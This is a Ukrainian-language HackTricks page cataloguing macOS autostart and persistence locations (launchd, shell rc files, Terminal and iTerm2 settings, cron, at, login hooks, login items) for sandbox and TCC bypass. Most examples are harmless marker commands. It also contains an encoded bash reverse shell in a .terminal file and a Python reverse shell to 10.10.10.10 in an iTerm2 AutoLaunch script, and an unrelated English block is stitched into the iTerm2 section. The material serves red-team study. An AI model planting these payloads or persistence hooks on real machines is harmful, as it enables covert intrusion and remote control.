# Автозапуск macOS

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

Цей розділ сильно ґрунтується на блозі [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), мета - додати **більше місць автозапуску** (якщо можливо), вказати **які техніки все ще працюють** в наш час з останньою версією macOS (13.4) та уточнити **необхідні дозволи**.

## Обхід пісочниці

{% hint style="success" %}
Тут ви можете знайти місця запуску, корисні для **обходу пісочниці**, що дозволяють вам просто виконати щось, **записавши це в файл** та **чекаючи** на дуже **загальну дію**, визначений **час** або **дію, яку ви зазвичай можете виконати** зсередини пісочниці без необхідності кореневих дозволів.
{% endhint %}

### Launchd

* Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місця

* **`/Library/LaunchAgents`**
* **Тригер**: Перезавантаження
* Потрібен корінь
* **`/Library/LaunchDaemons`**
* **Тригер**: Перезавантаження
* Потрібен корінь
* **`/System/Library/LaunchAgents`**
* **Тригер**: Перезавантаження
* Потрібен корінь
* **`/System/Library/LaunchDaemons`**
* **Тригер**: Перезавантаження
* Потрібен корінь
* **`~/Library/LaunchAgents`**
* **Тригер**: Перезавантаження
* **`~/Library/LaunchDemons`**
* **Тригер**: Перезавантаження

#### Опис та Експлуатація

**`launchd`** - це **перший** **процес**, який виконується ядром OX S при запуску та останній, що завершується при вимкненні. Він завжди повинен мати **PID 1**. Цей процес буде **читати та виконувати** конфігурації, вказані в **ASEP** **plists** в:

* `/Library/LaunchAgents`: Агенти для користувача, встановлені адміністратором
* `/Library/LaunchDaemons`: Демони для всієї системи, встановлені адміністратором
* `/System/Library/LaunchAgents`: Агенти для користувача, надані Apple.
* `/System/Library/LaunchDaemons`: Демони для всієї системи, надані Apple.

Коли користувач увійшов у систему, plists, розташовані в `/Users/$USER/Library/LaunchAgents` та `/Users/$USER/Library/LaunchDemons`, запускаються з **дозволами ввійшовших користувачів**.

**Основна різниця між агентами та демонами полягає в тому, що агенти завантажуються при вході користувача, а демони завантажуються при запуску системи** (оскільки є служби, такі як ssh, які потрібно виконати до того, як будь-який користувач отримає доступ до системи). Крім того, агенти можуть використовувати GUI, тоді як демони повинні працювати в фоновому режимі.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Є випадки, коли **агент потрібно виконати до входу користувача**, їх називають **PreLoginAgents**. Наприклад, це корисно для надання технологій допомоги при вході. Їх також можна знайти в `/Library/LaunchAgents` (див. [**тут**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) приклад).

{% hint style="info" %}
Нові файли конфігурації служб або агентів будуть **завантажені після наступного перезавантаження або за допомогою** `launchctl load <target.plist>`. Також можна **завантажити файли .plist без цього розширення** за допомогою `launchctl -F <file>` (проте ці файли plist не будуть автоматично завантажені після перезавантаження).\
Також можна **відвантажити** за допомогою `launchctl unload <target.plist>` (процес, на який він вказує, буде завершено),

Щоб **забезпечити**, що нічого (наприклад, перевизначення) **не перешкоджає** **Агенту** або **Демону** **запускатися**, виконайте: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Перелічити всі агенти та демони, завантажені поточним користувачем:
```bash
launchctl list
```
{% hint style="warning" %}
Якщо plist належить користувачеві, навіть якщо він знаходиться в системних папках демонів, **задача буде виконана як користувач**, а не як root. Це може запобігти деяким атакам на підвищення привілеїв.
{% endhint %}

### Файли запуску оболонки

Опис: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Опис (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
* Але вам потрібно знайти додаток з обхідом TCC, який виконує оболонку, що завантажує ці файли

#### Місця

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Спрацьовує**: Відкрити термінал з zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Спрацьовує**: Відкрити термінал з zsh
* Потрібен root
* **`~/.zlogout`**
* **Спрацьовує**: Вийти з терміналу з zsh
* **`/etc/zlogout`**
* **Спрацьовує**: Вийти з терміналу з zsh
* Потрібен root
* Можливо ще в: **`man zsh`**
* **`~/.bashrc`**
* **Спрацьовує**: Відкрити термінал з bash
* `/etc/profile` (не працювало)
* `~/.profile` (не працювало)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Спрацьовує**: Очікується спрацювання з xterm, але **він не встановлений** і навіть після встановлення видається помилка: xterm: `DISPLAY is not set`

#### Опис та Використання

При ініціалізації середовища оболонки, таких як `zsh` або `bash`, **запускаються певні файли запуску**. В macOS наразі використовується `/bin/zsh` як оболонка за замовчуванням. Ця оболонка автоматично викликається при запуску додатка Термінал або при доступі до пристрою через SSH. Хоча `bash` та `sh` також присутні в macOS, їх потрібно явно викликати для використання.

Сторінка man для zsh, яку ми можемо прочитати за допомогою **`man zsh`**, містить довгий опис файлів запуску.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Відкриті програми

{% hint style="danger" %}
Налаштування вказаної експлуатації та виходу з системи та повторного входу або навіть перезавантаження не допомогли мені виконати програму. (Програма не запускалася, можливо, вона повинна бути запущена під час виконання цих дій)
{% endhint %}

**Опис**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Корисно для обхідної пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Тригер**: Перезапуск відкриття програм

#### Опис та Експлуатація

Усі програми для повторного відкриття знаходяться всередині plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Отже, щоб зробити відкриття програм запускати вашу власну, вам просто потрібно **додати вашу програму до списку**.

UUID можна знайти, перераховуючи цей каталог або за допомогою `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Щоб перевірити програми, які будуть відкриті, ви можете виконати:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Для **додавання програми до цього списку** ви можете скористатися:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Налаштування терміналу

* Корисно для обхідної пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
* Термінал використовує дозволи FDA користувача, який його використовує

#### Місце

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Тригер**: Відкриття терміналу

#### Опис та експлуатація

У **`~/Library/Preferences`** зберігаються налаштування користувача в додатках. Деякі з цих налаштувань можуть містити конфігурацію для **виконання інших додатків/скриптів**.

Наприклад, термінал може виконати команду при запуску:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Ця конфігурація відображена у файлі **`~/Library/Preferences/com.apple.Terminal.plist`** наступним чином:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Таким чином, якщо plist установок терміналу в системі може бути перезаписаний, то **функціонал `open` може бути використаний для відкриття терміналу та виконання цієї команди**.

Ви можете додати це з командного рядка за допомогою:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Сценарії терміналу / Інші розширення файлів

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
* Термінал використовує права FDA користувача, якщо він його використовує

#### Місце

* **Будь-де**
* **Тригер**: Відкриття терміналу

#### Опис та Використання

Якщо ви створите [**`.terminal`** сценарій](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) та відкриєте його, **Додаток Термінал** автоматично буде викликаний для виконання команд, вказаних там. Якщо додаток Термінал має деякі спеціальні привілеї (наприклад, TCC), ваша команда буде виконана з цими спеціальними привілеями.

Спробуйте це:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Ви також можете використовувати розширення **`.command`**, **`.tool`**, зі звичайним вмістом оболонки, і вони також будуть відкриватися за допомогою Терміналу.

{% hint style="danger" %}
Якщо у терміналі є **Повний доступ до диска**, він зможе завершити цю дію (зверніть увагу, що виконана команда буде видима у вікні терміналу).
{% endhint %}

### Аудіо-плагіни

Опис: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Опис: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Можливо отримати додатковий доступ TCC

#### Місцезнаходження

* **`/Library/Audio/Plug-Ins/HAL`**
* Потрібні права адміністратора
* **Спуск**: Перезапустіть coreaudiod або комп'ютер
* **`/Library/Audio/Plug-ins/Components`**
* Потрібні права адміністратора
* **Спуск**: Перезапустіть coreaudiod або комп'ютер
* **`~/Library/Audio/Plug-ins/Components`**
* **Спуск**: Перезапустіть coreaudiod або комп'ютер
* **`/System/Library/Components`**
* Потрібні права адміністратора
* **Спуск**: Перезапустіть coreaudiod або комп'ютер

#### Опис

Згідно з попередніми описами, можна **скомпілювати деякі аудіо-плагіни** та завантажити їх.

### Плагіни QuickLook

Опис: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Можливо отримати додатковий доступ TCC

#### Місцезнаходження

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Опис та Використання

Плагіни QuickLook можуть бути виконані, коли ви **запускаєте попередній перегляд файлу** (натисніть пробіл з вибраним файлом у Finder) і встановлений **плагін, що підтримує цей тип файлу**.

Можливо скомпілювати власний плагін QuickLook, розмістити його в одному з попередніх місць для завантаження і потім перейти до підтримуваного файлу та натиснути пробіл для його запуску.

### ~~Гачки входу/виходу~~

{% hint style="danger" %}
Це не працювало для мене, ні з гачком входу користувача, ні з гачком виходу кореневого користувача
{% endhint %}

**Опис**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

* Вам потрібно мати можливість виконати щось на зразок `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* Розташовано в `~/Library/Preferences/com.apple.loginwindow.plist`

Вони застарілі, але можуть бути використані для виконання команд при вході користувача.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Цей параметр зберігається в `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Щоб видалити це:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Користувач root зберігається в **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Умовне уникнення пісочниці

{% hint style="success" %}
Тут ви можете знайти місця запуску, корисні для **унікального уникнення пісочниці**, що дозволяє вам просто виконати щось, **записавши це в файл** та **очікуючи не дуже поширених умов**, таких як конкретні **встановлені програми, "незвичайні" дії користувача** або середовища.
{% endhint %}

### Cron

**Опис**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Однак вам потрібно мати можливість виконати бінарний файл `crontab`
* Або бути root
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місце

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Потрібен root для прямого запису. Root не потрібен, якщо ви можете виконати `crontab <файл>`
* **Тригер**: Залежить від роботи cron

#### Опис та експлуатація

Перелічте роботи cron **поточного користувача** за допомогою:
```bash
crontab -l
```
Ви також можете побачити всі cron-завдання користувачів у **`/usr/lib/cron/tabs/`** та **`/var/at/tabs/`** (потрібні права root).

У MacOS кілька папок, які виконують скрипти з **певною частотою**, можна знайти в:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Тут ви можете знайти звичайні **cron** **завдання**, **at** **завдання** (не дуже використовується) та **періодичні** **завдання** (головним чином використовується для очищення тимчасових файлів). Щоденні періодичні завдання можна виконати, наприклад, за допомогою команди: `periodic daily`.

Для додавання **користувацького cronjob програмно** можна використовувати:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Опис: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 використовується для надання дозволів TCC

#### Місця

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Тригер**: Відкриття iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Тригер**: Відкриття iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Тригер**: Відкриття iTerm

#### Опис та Використання

Скрипти, збережені в **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**, будуть виконані. Наприклад:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
### MacOS Auto Start Locations

#### Launch Agents

Launch Agents are used to run commands when a user logs in. They are stored in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.

#### Launch Daemons

Launch Daemons are used to run commands at system startup. They are stored in `/Library/LaunchDaemons/`.

#### Login Items

Login Items are applications that open when a user logs in. They can be managed in `System Preferences > Users & Groups > Login Items`.

#### Startup Items

Startup Items are legacy items that automatically launch when a user logs in. They are stored in `/Library/StartupItems/`.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Скрипт **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** також буде виконаний:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Налаштування iTerm2, розташовані в **`~/Library/Preferences/com.googlecode.iterm2.plist`**, можуть **вказувати команду для виконання** при відкритті терміналу iTerm2.

Це налаштування можна сконфігурувати в налаштуваннях iTerm2:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

І команда відображається в налаштуваннях:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Ви можете встановити команду для виконання за допомогою:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Висока ймовірність, що існують **інші способи використання налаштувань iTerm2** для виконання довільних команд.
{% endhint %}

### xbar

Опис: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Але потрібно встановити xbar
* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
* Він запитує дозволи на доступність

#### Місце розташування

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Тригер**: Після запуску xbar

#### Опис

Якщо встановлено популярну програму [**xbar**](https://github.com/matryer/xbar), можна написати shell-сценарій в **`~/Library/Application\ Support/xbar/plugins/`**, який буде виконуватися при запуску xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Опис**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Але Hammerspoon повинен бути встановлений
* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
* Він запитує дозволи на доступність

#### Місце

* **`~/.hammerspoon/init.lua`**
* **Тригер**: Після запуску Hammerspoon

#### Опис

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) служить як платформа автоматизації для **macOS**, використовуючи **мову сценаріїв LUA** для своєї роботи. Зокрема, він підтримує інтеграцію повного коду AppleScript та виконання оболонкових сценаріїв, що значно підвищує його можливості сценаріювання.

Додаток шукає один файл, `~/.hammerspoon/init.lua`, і при запуску виконується сценарій.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* Корисний для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Але BetterTouchTool повинен бути встановлений
* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
* Він запитує дозволи на автоматизацію, ярлики та доступність

#### Місце

* `~/Library/Application Support/BetterTouchTool/*`

Цей інструмент дозволяє вказати програми або скрипти для виконання, коли деякі скорочення натиснуті. Атакувальник може налаштувати своє власне **скорочення та дію для виконання в базі даних**, щоб виконати довільний код (скорочення може бути просто натисканням клавіші).

### Alfred

* Корисний для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Але потрібно встановити Alfred
* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
* Він запитує дозволи на автоматизацію, доступність та навіть повний доступ до диска

#### Місце

* `???`

Це дозволяє створювати робочі процеси, які можуть виконувати код, коли виконуються певні умови. Потенційно атакувальник може створити файл робочого процесу і змусити Alfred завантажити його (потрібно оплатити преміальну версію для використання робочих процесів).

### SSHRC

Опис: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Корисний для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Але потрібно включити та використовувати ssh
* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
* SSH використовує доступ до FDA

#### Місце

* **`~/.ssh/rc`**
* **Тригер**: Вхід через ssh
* **`/etc/ssh/sshrc`**
* Потрібен root
* **Тригер**: Вхід через ssh

{% hint style="danger" %}
Для включення ssh потрібен повний доступ до диска:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Опис & Використання

За замовчуванням, якщо `PermitUserRC no` в `/etc/ssh/sshd_config`, коли користувач **входить через SSH**, скрипти **`/etc/ssh/sshrc`** та **`~/.ssh/rc`** будуть виконані.

### **Елементи входу**

Опис: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Але вам потрібно виконати `osascript` з аргументами
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місця

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Тригер:** Вхід
* Використання вразливості для виклику **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Тригер:** Вхід
* Потрібні права адміністратора

#### Опис

У Налаштування системи -> Користувачі та групи -> **Елементи входу** можна знайти **елементи, які виконуються при вході користувача**.\
Можливо вивести їх, додати та видалити з командного рядка:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ці елементи зберігаються в файлі **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Елементи входу** також можуть бути вказані за допомогою API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), який збереже конфігурацію в **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP як елемент входу

(Перевірте попередній розділ про Елементи входу, це розширення)

Якщо ви збережете файл **ZIP** як **Елемент входу**, **`Archive Utility`** відкриє його, і якщо ZIP, наприклад, був збережений у **`~/Library`** і містив папку **`LaunchAgents/file.plist`** з задніми дверима, ця папка буде створена (за замовчуванням вона не існує), і plist буде доданий, так що наступного разу, коли користувач знову увійде в систему, **задні двері, вказані в plist, будуть виконані**.

Іншою опцією буде створення файлів **`.bash_profile`** та **`.zshenv`** всередині домашнього каталогу користувача, тому якщо папка LaunchAgents вже існує, ця техніка все одно буде працювати.

### At

Опис: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
* Але вам потрібно **виконати** **`at`** і воно повинно бути **увімкнене**
* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Місцезнаходження

* Потрібно **виконати** **`at`** і воно повинно бути **увімкнене**

#### **Опис**

Завдання `at` призначені для **планування одноразових завдань** для виконання в певний час. На відміну від робіт cron, завдання `at` автоматично видаляються після виконання. Важливо зауважити, що ці завдання є постійними після перезавантаження системи, що робить їх потенційними проблемами безпеки в певних умовах.

За **замовчуванням** вони **вимкнені**, але користувач **root** може **увімкнути** **їх** за допомогою:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Це створить файл через 1 годину:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Перевірте чергу завдань за допомогою `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Вище ми бачимо дві заплановані задачі. Ми можемо вивести деталі задачі за допомогою `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Якщо завдання AT не активовані, створені завдання не будуть виконані.
{% endhint %}

**Файли завдань** можна знайти за шляхом `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Ім'я файлу містить чергу, номер завдання та час його запуску. Наприклад, розглянемо `a0001a019bdcd2`.

* `a` - це черга
* `0001a` - номер завдання у шістнадцятковій системі, `0x1a = 26`
* `019bdcd2` - час у шістнадцятковій системі. Він представляє хвилини, що минули з початку епохи. `0x019bdcd2` дорівнює `26991826` у десятковій системі. Якщо ми помножимо його на 60, ми отримаємо `1619509560`, що відповідає `GMT: 2021. Квітень 27., Вівторок 7:46:00`.

Якщо ми виведемо файл завдання, ми побачимо, що він містить ту саму інформацію, яку ми отримали за допомогою `at -c`.

### Дії з папками

